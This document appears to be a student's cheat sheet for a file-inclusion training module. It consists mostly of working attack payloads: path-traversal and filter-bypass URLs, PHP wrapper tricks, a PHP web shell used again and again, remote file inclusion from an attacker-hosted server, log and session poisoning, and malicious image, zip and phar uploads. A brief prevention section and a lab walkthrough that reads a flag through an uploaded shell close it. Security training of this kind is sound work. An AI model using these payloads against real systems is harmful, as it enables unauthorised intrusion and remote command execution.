# Intro to File Inclusions 

**PHP Vulnerable Functions**

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

**NodeJS Vulnerable Functions**

```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
       res.write(data);
   });
}
```

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

**Java Vulnerable Functions**

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```

**.NET Vulnerable Functions**

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %>
}
```

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

**URL Parameter Patterns**

```http
/index.php?page=about
```

```http
?language=es
```

```http
/about/en
```

```http
/about/es
```




# Local File Inclusion (LFI) 

**Basic LFI - Absolute Path**

```http
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```

```http
http://<SERVER_IP>:<PORT>/index.php?language=C:\Windows\boot.ini
```

**Path Traversal**

```http
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

**Filename Prefix Bypass**

```http
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

**Vulnerable PHP Code Patterns**

```php
include($_GET['language']);
```

```php
include("./languages/" . $_GET['language']);
```

```php
include("lang_" . $_GET['language']);
```

```php
include($_GET['language'] . ".php");
```

**Second-Order Attack - Malicious Username Payload**

```text
../../../etc/passwd
```

**Second-Order Attack - Affected Endpoint Pattern**

```http
/profile/$username/avatar.png
```


# Basic Bypasses 

**Non-Recursive Filter Bypass**

```http
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```

```text
..././
....\/
....////
```

**Vulnerable PHP Filter Code**

```php
$language = str_replace('../', '', $_GET['language']);
```

**URL Encoding Bypass**

```http
<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

```text
../  →  %2e%2e%2f
```

**Approved Path Bypass**

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

```http
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

**Path Truncation (PHP < 5.3/5.4)**

```text
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

**Null Byte Injection (PHP < 5.5)**

```text
/etc/passwd%00
```

```http
/etc/passwd%00.php
```

---

---



# PHP Filters 

**Fuzzing for PHP Files**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

**PHP Filter Wrapper - Base64 Source Disclosure**

```text
php://filter/read=convert.base64-encode/resource=config
```

```http
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

**Decode Base64 Output**

```bash
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

**Standard PHP Inclusion (no filter)**

```http
http://<SERVER_IP>:<PORT>/index.php?language=config
```

---

---


# PHP Wrappers 

**Read PHP Configuration - Apache**

```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

**Read PHP Configuration - Nginx**

```text
/etc/php/X.Y/fpm/php.ini
```

**Check allow_url_include**

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

**Check expect Extension**

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

**data Wrapper - Encode Web Shell**

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

**data Wrapper - RCE via Browser**

```http
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

**data Wrapper - RCE via curl**

```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

**input Wrapper - RCE via POST**

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

**expect Wrapper - RCE**

```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid
```

**Web Shell Payload**

```php
<?php system($_GET["cmd"]); ?>
```

**Base64 Encoded Web Shell**

```text
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

# Remote File Inclusion (RFI) 

**Verify RFI - Local URL Test**

```http
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

**Check allow_url_include**

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

**Create Web Shell**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**HTTP - Start Python Server**

```bash
sudo python3 -m http.server <LISTENING_PORT>
```

**HTTP - RFI Execution**

```http
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

**FTP - Start FTP Server**

```bash
sudo python -m pyftpdlib -p 21
```

**FTP - RFI Execution**

```http
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```

**FTP - RFI with Credentials**

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

**SMB - Start SMB Server**

```bash
impacket-smbserver -smb2support share $(pwd)
```

**SMB - RFI Execution**

```http
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

**Web Shell Payload**

```php
<?php system($_GET["cmd"]); ?>
```

---

---


# LFI and File Uploads 

**Image Upload - Craft Malicious GIF**

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

**Image Upload - Upload Path**

```http
http://<SERVER_IP>:<PORT>/settings.php
```

**Image Upload - HTML Source Path**

```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**Image Upload - LFI Execution**

```http
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

**Zip Upload - Create Zipped Shell**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Zip Upload - LFI Execution**

```http
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

**Phar Upload - shell.php Script**

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

**Phar Upload - Compile and Rename**

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

**Phar Upload - LFI Execution**

```http
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

**Web Shell Payload**

```php
<?php system($_GET["cmd"]); ?>
```

---

---


# Log Poisoning 

**PHP Session Poisoning - Include Session File**

```http
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

**PHP Session Poisoning - Session File Paths**

```text
/var/lib/php/sessions/sess_<PHPSESSID>
C:\Windows\Temp\sess_<PHPSESSID>
```

**PHP Session Poisoning - Test Control of page Value**

```http
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

**PHP Session Poisoning - Write Web Shell to Session**

```http
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

**PHP Session Poisoning - Execute Command**

```http
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

**Server Log Poisoning - Include Apache Log**

```http
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

**Server Log Poisoning - Apache/Nginx Log Paths**

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
C:\xampp\apache\logs\
/var/log/nginx/access.log
/var/log/nginx/error.log
C:\nginx\log\
```

**Server Log Poisoning - Poison via curl**

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

**Server Log Poisoning - Execute Command via Poisoned Log**

```http
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

**Proc File Paths for User-Agent Poisoning**

```text
/proc/self/environ
/proc/self/fd/0
/proc/self/fd/1
```

**Other Poisonable Log Files**

```text
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
```

**Web Shell Payload (URL Encoded)**

```text
%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

**Web Shell Payload (Plain)**

```php
<?php system($_GET["cmd"]); ?>
```

---

---


# Automated Scanning 


**Fuzz for Exposed GET Parameters**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

**Fuzz LFI Payloads Against Parameter**

```bash
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

**Fuzz Server Webroot - Linux**

```bash
ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

**Fuzz Server Logs and Configs - Linux Wordlist**

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

**Read Apache Config**

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
```

**Read Apache Envvars**

```bash
curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

**Wordlist Paths**

```text
/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
/opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
./LFI-WordList-Linux
```

**Key Config and Log File Paths**

```text
/etc/apache2/apache2.conf
/etc/apache2/envvars
/var/log/apache2/access.log
/var/log/apache2/error.log
/etc/hosts
/etc/hostname
/etc/fstab
```

**LFI Tools**

```text
LFISuite
LFiFreak
liffy
```

---

---


# File Inclusion Prevention 

**Recursive Directory Traversal Sanitization**

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
};
```

**PHP basename() Usage**

```text
basename()
```

**PHP Configuration - Disable Remote Inclusion**

```text
allow_url_fopen = Off
allow_url_include = Off
```

**PHP Configuration - Lock to Web Root**

```text
open_basedir = /var/www
```

**Bash Wildcard Traversal Edge Case**

```bash
cat .?/.*/.?/etc/passwd
```

**PHP Wildcard Behavior Test**

```text
php -a
echo file_get_contents('.?/.*/.?/etc/passwd');
```

**WAF**

```text
ModSecurity
```

**Dangerous Modules to Disable**

```text
PHP Expect
mod_userdir
```
# Skills Assessment - File Inclusion 

**Fuzz LFI Payloads on image.php**

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.73:31949/api/image.php?p=FUZZ' -fs 0
```

**Confirm LFI via curl**

```bash
curl http://154.57.164.73:31949/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```

**Fuzz Parameters on contact.php**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.67:32736/contact.php?FUZZ=vlaue' | grep -v 1771
```

**Fuzz Parameters on image.php**

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.74:31218/api/image.php?region=FUZZ'
```

**Directory Enumeration - Merge Wordlists**

```bash
cat /usr/share/seclists/Discovery/Web-Content/{common.txt,burp-parameter-names.txt} | sort -u > app-files.txt
```

**Directory Enumeration - feroxbuster**

```bash
feroxbuster -u http://154.57.164.74:31218/ -w app-files.txt -r -t 50 -k -x php -S 3405
```

**Read application.php via LFI**

```bash
curl http://154.57.164.74:31218/api/image.php?p=....//api//application.php
```

**Discovered application.php Source**

```php
<?php
$firstName = $_POST["firstName"];
$lastName = $_POST["lastName"];
$email = $_POST["email"];
$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;

$tmp_name = $_FILES["file"]["tmp_name"];
$file_name = $_FILES["file"]["name"];
$ext = end((explode(".", $file_name)));
$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
move_uploaded_file($tmp_name, $target_file);

header("Location: /thanks.php?n=" . urlencode($firstName));
?>
```

**Upload Path Pattern**

```text
../uploads/<md5_of_file>.<ext>
```

**Double URL Encoded Traversal Token**

```text
%252E%252E%252F
```

**RCE via Uploaded Shell - List Root**

```http
http://154.57.164.81:32019/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=ls%20/
```

**RCE via Uploaded Shell - Read Flag**

```http
http://154.57.164.81:32019/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=cat%20/flag_09ebca.txt
```

**Flag Filename**

```text
flag_09ebca.txt
```

**Uploaded Shell MD5 Filename**

```text
fc023fcacb27a7ad72d605c4e300b389
```

